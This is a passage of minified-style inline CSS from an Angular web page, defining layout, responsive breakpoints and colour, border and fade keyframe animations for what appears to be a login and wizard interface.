            }
        }

        .backoffice [_nghost-c32] .ipswich-main-subtitle-step[_ngcontent-c32] {
            color: #ff4800;
            font-family: Verdana, Arial, Helvetica, sans-serif;
            font-size: 13px;
            font-weight: 600
        }

        .backoffice [_nghost-c32] .ipswich-pre-header-back-title-link[_ngcontent-c32] i[_ngcontent-c32] {
            color: #ff4800
        }

        .bots [_nghost-c32] .step.wizardAutoHeightMode[_ngcontent-c32] {
            height: 100%
        }

        .bots [_nghost-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32]+.ipswich-main-wizard-content[_ngcontent-c32] {
            height: calc(100% - 58px)
        }

        .step.fadeInICB[_ngcontent-c32] {
            opacity: 1;
            visibility: visible;
            opacity: 1;
            display: block;
            -webkit-animation: none;
            animation: none
        }

        .step.header-requestMode[_ngcontent-c32] .ipswich-main-wizard-header[_ngcontent-c32] {
            display: none
        }

        .step.header-requestMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] {
            display: block;
            width: 100%;
            height: 43px;
            padding: 7px 12px;
            background: #f8f8f8;
            border-bottom: 1px solid #d7d7d7;
            white-space: nowrap
        }

        .step.header-requestMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] .ipswich-main-subtitle-description[_ngcontent-c32] {
            max-width: calc(100% - 105px);
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .step.header-requestMode[_ngcontent-c32] .ipswich-main-wizard-content[_ngcontent-c32] {
            height: calc(100% - 85px)
        }

        .step[_ngcontent-c32] .ipswich-main-wizard-header[_ngcontent-c32] .ipswich-main-title.isLoginContractStep[_ngcontent-c32] {
            font-size: 29px
        }

        .step[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] .ipswich-main-subtitle-description.isLoginContractStep[_ngcontent-c32] {
            padding-left: 10px
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .step.wizardAutoHeightMode[_ngcontent-c32] {
                position: relative;
                float: none;
                height: auto
            }

            .step.wizardAutoHeightMode[_ngcontent-c32] .ipswich-main-wizard-footer[_ngcontent-c32] {
                margin-bottom: 20px
            }

            .step.wizardAutoHeightMode.extraFinancingWizardMode[_ngcontent-c32] .ipswich-main-wizard-footer[_ngcontent-c32] {
                margin-bottom: 0
            }
        }
    </style>
<style>
        @charset "UTF-8";

        @-webkit-keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @-webkit-keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @-webkit-keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @-webkit-keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @-webkit-keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @-webkit-keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @-webkit-keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @-webkit-keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @-webkit-keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @-webkit-keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @-webkit-keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @-webkit-keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @-webkit-keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @-webkit-keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @-webkit-keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @-webkit-keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @-webkit-keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @-webkit-keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        @keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        .ipswich-main-keyboard[_ngcontent-c33] {
            text-align: right;
            padding: 10px 74px 6px 42px
        }

        .ipswich-main-keyboard-link[_ngcontent-c33] {
            color: #0097c1;
            font-size: 12px;
            text-align: right;
            display: inline-block;
            cursor: pointer
        }

        .ipswich-main-keyboard-link[_ngcontent-c33]:hover {
            color: #005b75;
            text-decoration: underline
        }

        .ipswich-main-data[_ngcontent-c33] {
            padding: 24px 72px 0 42px
        }

        .ipswich-main-data[_ngcontent-c33] i[_ngcontent-c33] {
            font-size: 32px;
            margin-right: 4px;
            vertical-align: top;
            margin-top: 4px;
            display: inline-block;
            color: #17d2dc
        }

        .ipswich-main-data-input[_ngcontent-c33] {
            width: calc(100% - 42px);
            border: 1px solid #bbb;
            height: 40px;
            padding: 0 14px;
            font-size: 16px;
            color: #333
        }

        .ipswich-main-data-input.required[_ngcontent-c33],
        .ipswich-main-data-input.required[_ngcontent-c33]:focus {
            border-left: 3px solid #0097c1
        }

        .ipswich-main-data-input[_ngcontent-c33]:focus {
            border: 1px solid #999;
            outline: 0;
            background: #f2f6f6;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            -webkit-animation: .3s ipswich-login-input-animated;
            animation: .3s ipswich-login-input-animated
        }

        @-webkit-keyframes ipswich-login-input-animated {
            0% {
                border: 1px solid #bbb;
                background: 0 0;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                background: #f2f6f6;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes ipswich-login-input-animated {
            0% {
                border: 1px solid #bbb;
                background: 0 0;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                background: #f2f6f6;
                border-left: 3px solid #0097c1
            }
        }

        @-webkit-keyframes ipswich-login-input-line-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes ipswich-login-input-line-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                border-left: 3px solid #0097c1
            }
        }

        .ipswich-main-engagement-user[_ngcontent-c33] {
            position: absolute;
            width: 100%;
            bottom: -127px;
            left: 0;
            padding-right: 72px
        }

        .ipswich-main-engagement-data[_ngcontent-c33] {
            width: calc(100% - 36px);
            border-top: 1px solid #e1e1e1;
            padding: 8px 0 0;
            text-align: right
        }

        .ipswich-main-engagement-data-ul[_ngcontent-c33] {
            padding: 0;
            list-style: none;
            margin: 0
        }

        .ipswich-main-engagement-data-ul-item[_ngcontent-c33] {
            display: inline-block
        }

        .ipswich-main-engagement-data-ul-item-title[_ngcontent-c33] {
            color: #333;
            font-size: 14px;
            display: inline-block;
            vertical-align: middle
        }

        .ipswich-main-engagement-data-ul-item-pipe[_ngcontent-c33] {
            color: #666;
            font-size: 14px;
            display: inline-block;
            margin-left: 3px;
            margin-right: 3px;
            vertical-align: middle
        }

        .ipswich-main-engagement-data-ul-item-link[_ngcontent-c33] {
            color: #0097c1;
            font-size: 14px;
            display: inline-block;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            vertical-align: middle;
            cursor: pointer
        }

        .ipswich-main-engagement-data-ul-item-link[_ngcontent-c33]:hover {
            color: #005b75;
            text-decoration: underline
        }

        .ipswich-main-buttons-login-user[_ngcontent-c33] {
            padding-top: 24px;
            padding-right: 72px
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich-main-data[_ngcontent-c33] {
                padding: 8px 42px 0 32px
            }

            .ipswich-main-buttons-login-user[_ngcontent-c33] {
                padding-right: 42px;
                padding-top: 16px
            }

            .ipswich-main-engagement-user[_ngcontent-c33] {
                padding-right: 42px;
                position: relative;
                bottom: 0;
                margin-top: 64px
            }

            .ipswich-main-keyboard[_ngcontent-c33] {
                padding: 10px 42px 0
            }

            .ipswich-advertising[_ngcontent-c33] {
                width: 280px
            }
        }

        @media only screen and (max-width:1023px) and (min-width:320px) {
            .ipswich-main-keyboard[_ngcontent-c33] {
                visibility: hidden;
                pointer-events: none
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            form.wizardAutoHeightMode[_ngcontent-c33] .ipswich-main-engagement-user[_ngcontent-c33] {
                position: relative;
                bottom: auto;
                left: auto;
                margin-top: 30px;
                margin-bottom: 12px;
                text-align: right
            }

            form.wizardAutoHeightMode[_ngcontent-c33] .ipswich-main-engagement-user[_ngcontent-c33] .ipswich-main-engagement-data[_ngcontent-c33] {
                display: inline-block;
                float: none
            }

            .ipswich-main-keyboard[_ngcontent-c33] {
                display: none
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {

            .ipswich-main-engagement-data-ul-item-link[_ngcontent-c33],
            .ipswich-main-engagement-data-ul-item-title[_ngcontent-c33] {
                font-size: 12px;
                vertical-align: middle
            }

            .ipswich-main-data[_ngcontent-c33] {
                padding-top: 8px;
                padding-right: 20px;
                padding-left: 20px
            }

            .ipswich-main-keyboard[_ngcontent-c33] {
                padding-right: 24px;
                padding-left: 20px
            }

            .ipswich-main-data-input[_ngcontent-c33] {
                width: calc(100% - 42px)
            }

            .ipswich-main-buttons-login-user[_ngcontent-c33] {
                padding-right: 20px;
                padding-left: 20px;
                padding-bottom: 20px
            }

            .ipswich-main-buttons-login-user[_ngcontent-c33]>a[_ngcontent-c33] {
                width: 130px !important
            }

            .ipswich-main-engagement-user[_ngcontent-c33] {
                bottom: -88px;
                padding-right: 24px;
                padding-left: 24px
            }

            .ipswich-main-engagement-data[_ngcontent-c33] {
                width: 100%
            }
        }

        .bots [_nghost-c33] .hideStepUserInformation[_ngcontent-c33] {
            display: none
        }

        .bots [_nghost-c33] .ipswich-main-buttons-login-user[_ngcontent-c33] {
            position: absolute;
            bottom: 0;
            right: 0;
            padding-bottom: 20px
        }

        .bots [_nghost-c33] .ipswich[_ngcontent-c33] {
            height: 100%;
            border-bottom: 0
        }

        .successful-generic-message[_ngcontent-c33] {
            position: absolute;
            width: 100%;
            left: 0;
            bottom: -73px
        }

        .ipswich-fade-in[_ngcontent-c33] {
            -webkit-animation: .35s fadein;
            animation: .35s fadein
        }

        @-webkit-keyframes fadein {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadein {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        .suzuka-main[_ngcontent-c33] {
            -webkit-animation: .5s suzuka-main-animation-fade;
            animation: .5s suzuka-main-animation-fade;
            position: absolute;
            top: 67px;
            padding: 6px 72px 0 82px
        }

        .suzuka-main[_ngcontent-c33] .suzuka-main-check[_ngcontent-c33] {
            position: relative;
            padding: 0 0 0 21px;
            margin-bottom: 5px
        }

        .suzuka-main[_ngcontent-c33] .suzuka-main-check[_ngcontent-c33] input.suzuka-main-check-input[type=checkbox][_ngcontent-c33] {
            display: none
        }

        .suzuka-main[_ngcontent-c33] .suzuka-main-check[_ngcontent-c33] label.suzuka-main-check-label[_ngcontent-c33]:before {
            border-radius: 0
        }

        .suzuka-main[_ngcontent-c33] .suzuka-main-check[_ngcontent-c33] .suzuka-main-check-label[_ngcontent-c33] {
            font-size: 14px;
            color: #444
        }

        label.suzuka-main-check-label[_ngcontent-c33]:before {
            content: "";
            display: inline-block;
            width: 16px;
            height: 16px;
            margin-right: 6px;
            position: absolute;
            left: 0;
            bottom: 3px;
            background: 0 0;
            -webkit-box-shadow: none;
            box-shadow: none;
            border: 1px solid #ccc
        }

        input.suzuka-main-check-input[type=checkbox][_ngcontent-c33]:checked+label.suzuka-main-check-label[_ngcontent-c33]:before {
            content: "";
            font-size: 11px;
            color: #0097c1;
            text-align: center;
            line-height: 15px;
            font-weight: 700;
            font-family: streamline;
            border: 1px solid #0097c1
        }

        @-webkit-keyframes suzuka-main-animation {
            0% {
                -webkit-transform: translateY(-50%);
                transform: translateY(-50%)
            }

            100% {
                -webkit-transform: translateY(0);
                transform: translateY(0)
            }
        }

        @keyframes suzuka-main-animation {
            0% {
                -webkit-transform: translateY(-50%);
                transform: translateY(-50%)
            }

            100% {
                -webkit-transform: translateY(0);
                transform: translateY(0)
            }
        }

        @-webkit-keyframes suzuka-main-animation-fade {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes suzuka-main-animation-fade {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .suzuka-main[_ngcontent-c33] {
                top: 48px;
                padding-left: 72px
            }

            .successful-generic-message[_ngcontent-c33] {
                bottom: 54px
            }
        }

        @media only screen and (max-width:767px) and (min-width:480px) {
            .ipswich-main-buttons-login-user[_ngcontent-c33] {
                padding-top: 40px
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .successful-generic-message[_ngcontent-c33] {
                bottom: 36px
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {

            .ipswich-main-engagement-data-ul-item-link[_ngcontent-c33],
            .ipswich-main-engagement-data-ul-item-title[_ngcontent-c33] {
                font-size: 12px;
                vertical-align: middle
            }

            .successful-generic-message[_ngcontent-c33] {
                bottom: auto;
                top: 150px
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .suzuka-main[_ngcontent-c33] {
                top: 50px;
                padding-left: 61px
            }

            .ipswich-main-buttons-login-user[_ngcontent-c33] {
                padding-top: 40px
            }

            .successful-generic-message[_ngcontent-c33] {
                bottom: 58px
            }
        }
    </style>
<style>
        .successful-generic-message[_ngcontent-c34] {
            position: absolute;
            width: 100%;
            left: 0;
            bottom: -63px
        }

        .error-message[_ngcontent-c34] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 5px 0 0;
            padding: 0 72px 0 0;
            position: absolute;
            left: 85px;
            line-height: 1
        }

        .successful-message[_ngcontent-c34] {
            color: #00a756;
            background: #fff;
            font-weight: 500;
            display: block;
            margin: 5px 0 0;
            padding: 0;
            position: absolute;
            left: 85px
        }

        .error-message-bottom[_ngcontent-c34] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 5px 0 0;
            padding: 0;
            position: absolute;
            left: 85px
        }

        .successful-message-bottom[_ngcontent-c34] {
            color: #00a756;
            background: #fff;
            font-weight: 500;
            display: block;
            margin: 5px 0 0;
            padding: 0;
            position: absolute;
            left: 85px
        }

        .ipswich-main-keyboard[_ngcontent-c34] {
            text-align: right;
            padding: 10px 74px 6px 42px
        }

        .ipswich-main-keyboard-link[_ngcontent-c34] {
            color: #0097c1;
            font-size: 12px;
            text-align: right;
            display: inline-block;
            cursor: pointer
        }

        .ipswich-main-keyboard-link[_ngcontent-c34]:hover {
            color: #005b75;
            text-decoration: underline
        }

        .ipswich-main-data[_ngcontent-c34] {
            padding: 24px 72px 0 42px
        }

        .ipswich-main-data[_ngcontent-c34] i[_ngcontent-c34] {
            font-size: 32px;
            margin-right: 4px;
            vertical-align: top;
            margin-top: 4px;
            display: inline-block;
            color: #17d2dc
        }

        .ipswich-main-data-input[_ngcontent-c34] {
            width: calc(100% - 42px);
            border: 1px solid #bbb;
            height: 40px;
            padding: 0 14px;
            font-size: 16px;
            color: #333
        }

        .ipswich-main-data-input.required[_ngcontent-c34],
        .ipswich-main-data-input.required[_ngcontent-c34]:focus {
            border-left: 3px solid #0097c1
        }

        .ipswich-main-data-input[_ngcontent-c34]:focus {
            border: 1px solid #999;
            outline: 0;
            background: #f2f6f6;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            -webkit-animation: .3s ipswich-login-input-animated;
            animation: .3s ipswich-login-input-animated
        }

        @-webkit-keyframes ipswich-login-input-animated {
            0% {
                border: 1px solid #bbb;
                background: 0 0;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                background: #f2f6f6;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes ipswich-login-input-animated {
            0% {
                border: 1px solid #bbb;
                background: 0 0;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                background: #f2f6f6;
                border-left: 3px solid #0097c1
            }
        }

        @-webkit-keyframes ipswich-login-input-line-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes ipswich-login-input-line-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                border-left: 3px solid #0097c1
            }
        }

        .ipswich-main-validation-image[_ngcontent-c34] {
            width: 88px;
            display: inline-block;
            vertical-align: middle
        }

        .ipswich-main-validation-description[_ngcontent-c34] {
            display: inline-block;
            width: 50%;
            overflow: hidden;
            height: 100%;
            font-size: 14px;
            vertical-align: middle;
            padding-left: 11px;
            color: #666
        }

        .ipswich-main-validation[_ngcontent-c34] {
            padding: 0 0 0 78px
        }

        .ipswich-main-validation-image-preview[_ngcontent-c34] {
            width: 88px;
            display: inline-block;
            vertical-align: middle
        }

        .ipswich-main-engagement-data[_ngcontent-c34] {
            width: calc(100% - 36px);
            border-top: 1px solid #e1e1e1;
            padding: 8px 0 0;
            text-align: right
        }

        .ipswich-main-engagement-data-ul[_ngcontent-c34] {
            padding: 0;
            list-style: none;
            margin: 0
        }

        .ipswich-main-engagement-data-ul-item[_ngcontent-c34] {
            display: inline-block
        }

        .ipswich-main-engagement-data-ul-item-title[_ngcontent-c34] {
            color: #333;
            font-size: 14px;
